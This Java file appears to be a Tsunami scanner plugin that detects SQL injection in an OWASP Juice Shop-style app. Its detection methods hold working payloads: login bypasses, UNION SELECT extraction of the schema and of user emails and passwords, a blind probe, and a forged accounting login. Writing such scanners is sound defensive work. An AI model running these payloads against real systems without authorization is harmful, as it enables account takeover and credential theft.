/*
 * Copyright 2024 Lukas Pirch
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.raid;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static java.lang.String.format;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.inject.Inject;
import com.google.protobuf.util.Timestamps;
import com.google.protobuf.ByteString;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import com.google.tsunami.common.net.http.HttpHeaders;

import java.io.IOException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.time.Instant;
import java.time.Clock;
import java.util.regex.Pattern;
import java.util.regex.Matcher;

@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "SqlinjectiondetectorpluginDetector",
    version = "0.1",
    description = "Detects SqlInjectionDetectorPlugin vulnerability.",
    author = "Joscha, Elena the Debug Dingos",
    bootstrapModule = SqlinjectiondetectorpluginDetectorBootstrapModule.class)
public final class SqlinjectiondetectorpluginDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private final HttpClient httpClient;
  private final Clock utcClock;
  private String token = "";

  @Inject
  public SqlinjectiondetectorpluginDetector(HttpClient httpClient, @UtcClock Clock utcClock) {
    this.httpClient = httpClient;
    this.utcClock = checkNotNull(utcClock);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Starting detection for Sqlinjectiondetectorplugin Detector");
    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    int successfulAttacks = 0;
    
    try {
        HttpHeaders headers = HttpHeaders.builder()
            .addHeader("Accept", "application/json")
            .addHeader("Content-Type", "application/json")
            .build();
        
        // Attack 1: Login bypass with SQL injection
        if (testLoginBypass(targetUri, headers, networkService)) {
            successfulAttacks++;
        }
        
        // Attack 2: Schema exfiltration via UNION SELECT
        if (testSchemaExfiltration(targetUri, headers, networkService)) {
            successfulAttacks++;
        }
        
        // Attack 3: User credentials extraction
        if (testUserCredentialsExtraction(targetUri, headers, networkService)) {
            successfulAttacks++;
        }
        
        // Attack 4: Blind SQL injection for hidden products
        if (testBlindSqlInjection(targetUri, headers, networkService)) {
            successfulAttacks++;
        }
        
        // Attack 5: Advanced UNION SELECT for non-existing user creation
        if (testAdvancedUnionSelect(targetUri, headers, networkService)) {
            successfulAttacks++;
        }
        
    } catch (IOException e) {
        logger.atWarning().log(
            format("SQL injection test failed on '%s': %s", networkService, e.getMessage()));
        return false;
    }
    
    return successfulAttacks > 0;
}

private boolean testLoginBypass(String targetUri, HttpHeaders headers, NetworkService networkService) throws IOException {
    // Test login bypass with ' or 1=1--
    String loginPayload = "{\"email\":\"' or 1=1--\",\"password\":\"test\"}";
    
    HttpResponse loginResponse = httpClient.send(
        HttpRequest.post(targetUri + "/rest/user/login")
            .setHeaders(headers)
            .setRequestBody(ByteString.copyFromUtf8(loginPayload))
            .build(),
        networkService);
    
    if (loginResponse.status().code() == 200) {
        String responseBody = loginResponse.bodyBytes()
            .map(bs -> bs.toStringUtf8())
            .orElse("");
        // Check for authentication token or success indicators
        if (responseBody.contains("token") || responseBody.contains("authentication")) {
            return true;
        }
    }
    
    // Test alternative admin bypass
    String adminPayload = "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"test\"}";
    
    HttpResponse adminResponse = httpClient.send(
        HttpRequest.post(targetUri + "/rest/user/login")
            .setHeaders(headers)
            .setRequestBody(ByteString.copyFromUtf8(adminPayload))
            .build(),
        networkService);
    
    if (adminResponse.status().code() == 200) {
        String responseBody = adminResponse.bodyBytes()
            .map(bs -> bs.toStringUtf8())
            .orElse("");
        if (responseBody.contains("token") || responseBody.contains("authentication")) {
            return true;
        }
    }
    
    return false;
}

private boolean testSchemaExfiltration(String targetUri, HttpHeaders headers, NetworkService networkService) throws IOException {
    String schemaPayload = "qwert')) UNION SELECT sql, '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_master--";
    
    HttpResponse schemaResponse = httpClient.send(
        HttpRequest.get(
            targetUri + "/rest/products/search?q="
                + URLEncoder.encode(schemaPayload, StandardCharsets.UTF_8))
            .setHeaders(headers)
            .build(),
        networkService);
    
    if (schemaResponse.status().code() == 200) {
        String responseBody = schemaResponse.bodyBytes()
            .map(bs -> bs.toStringUtf8())
            .orElse("");
        // Check for SQL schema keywords
        if (responseBody.contains("CREATE TABLE") || responseBody.contains("sqlite_master")) {
            return true;
        }
    }
    
    return schemaResponse.status().code() >= 500; // Server error indicates SQL injection
}

private boolean testUserCredentialsExtraction(String targetUri, HttpHeaders headers, NetworkService networkService) throws IOException {
    String userPayload = "qwert')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users--";
    
    HttpResponse userResponse = httpClient.send(
        HttpRequest.get(
            targetUri + "/rest/products/search?q="
                + URLEncoder.encode(userPayload, StandardCharsets.UTF_8))
            .setHeaders(headers)
            .build(),
        networkService);
    
    if (userResponse.status().code() == 200) {
        String responseBody = userResponse.bodyBytes()
            .map(bs -> bs.toStringUtf8())
            .orElse("");
        // Check for email addresses in response
        Pattern emailPattern = Pattern.compile("[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,}");
        Matcher matcher = emailPattern.matcher(responseBody);
        if (matcher.find()) {
            return true;
        }
    }
    
    return userResponse.status().code() >= 500; // Server error indicates SQL injection
}

private boolean testBlindSqlInjection(String targetUri, HttpHeaders headers, NetworkService networkService) throws IOException {
    // First get baseline response
    HttpResponse baselineResponse = httpClient.send(
        HttpRequest.get(targetUri + "/rest/products/search?q=test")
            .setHeaders(headers)
            .build(),
        networkService);
    
    String blindPayload = "'))--";
    
    HttpResponse blindResponse = httpClient.send(
        HttpRequest.get(
            targetUri + "/rest/products/search?q="
                + URLEncoder.encode(blindPayload, StandardCharsets.UTF_8))
            .setHeaders(headers)
            .build(),
        networkService);
    
    if (baselineResponse.status().code() == 200 && blindResponse.status().code() == 200) {
        String baselineBody = baselineResponse.bodyBytes()
            .map(bs -> bs.toStringUtf8())
            .orElse("");
        String blindBody = blindResponse.bodyBytes()
            .map(bs -> bs.toStringUtf8())
            .orElse("");
        
        // Check if blind injection returns more products (including deleted ones)
        if (blindBody.length() > baselineBody.length() && 
            (blindBody.contains("Christmas") || blindBody.contains("2014"))) {
            return true;
        }
    }
    
    return false;
}

private boolean testAdvancedUnionSelect(String targetUri, HttpHeaders headers, NetworkService networkService) throws IOException {
    String advancedPayload = "' UNION SELECT 15 as id, '' as username, 'acc0unt4nt@juice-sh.op' as email, '12345' as password, 'accounting' as role, '' as deluxeToken, '' as lastLoginIp, '' as profileImage, '' as totpSecret, '' as isActive, '' as createdAt, '' as updatedAt--";
    
    String loginPayload = "{\"email\":\"" + advancedPayload + "\",\"password\":\"test\"}";
    
    HttpResponse advancedResponse = httpClient.send(
        HttpRequest.post(targetUri + "/rest/user/login")
            .setHeaders(headers)
            .setRequestBody(ByteString.copyFromUtf8(loginPayload))
            .build(),
        networkService);
    
    if (advancedResponse.status().code() == 200) {
        String responseBody = advancedResponse.bodyBytes()
            .map(bs -> bs.toStringUtf8())
            .orElse("");
        // Check for successful authentication with accounting role
        if (responseBody.contains("token") && responseBody.contains("accounting")) {
            return true;
        }
    }
    
    return advancedResponse.status().code() >= 500; // Server error indicates SQL injection
}

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(
            Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("SQLINJECTIONDETECTORPLUGIN_VULNERABILITY"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("SqlInjectionDetectorPlugin Vulnerability Exposed")
                .setDescription("The application is vulnerable to SqlInjectionDetectorPlugin attacks.")
                .setRecommendation(
                    "Implement proper input validation, use parameterized queries or prepared statements, apply the principle of least privilege for database accounts, and implement proper error handling to prevent information disclosure"))
        .build();
  }
  
  public ImmutableList<Vulnerability> getAdvisories() {
    return ImmutableList.of(
        Vulnerability.newBuilder()
            .setMainId(
                VulnerabilityId.newBuilder()
                    .setPublisher("TSUNAMI_COMMUNITY")
                    .setValue("SQLINJECTIONDETECTORPLUGIN_VULNERABILITY"))
            .setSeverity(Severity.CRITICAL)
            .setTitle("SqlInjectionDetectorPlugin Vulnerability Exposed")
            .setDescription(
                "The application is vulnerable to SqlInjectionDetectorPlugin attacks.")
            .setRecommendation(
                "Implement proper input validation, use parameterized queries or prepared statements, apply the principle of least privilege for database accounts, and implement proper error handling to prevent information disclosure")
        .build());
  }
}